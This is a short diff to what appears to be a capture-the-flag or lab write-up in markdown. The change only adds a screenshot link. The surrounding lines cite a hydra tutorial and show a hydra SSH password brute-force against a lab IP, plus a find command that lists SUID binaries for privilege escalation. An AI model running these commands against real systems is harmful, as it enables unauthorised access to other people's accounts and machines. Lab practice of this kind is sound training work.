@@ -35,6 +35,8 @@ https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
 
 ![](https://i.imgur.com/MdvNqDN.png)
 ![](https://i.imgur.com/2Xhqji1.png)
+![](https://i.imgur.com/fE7CWqb.png)
+
 `hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4`
 `find -perm -4000 2> /dev/null`
 ![](https://i.imgur.com/0LOwRRt.png)
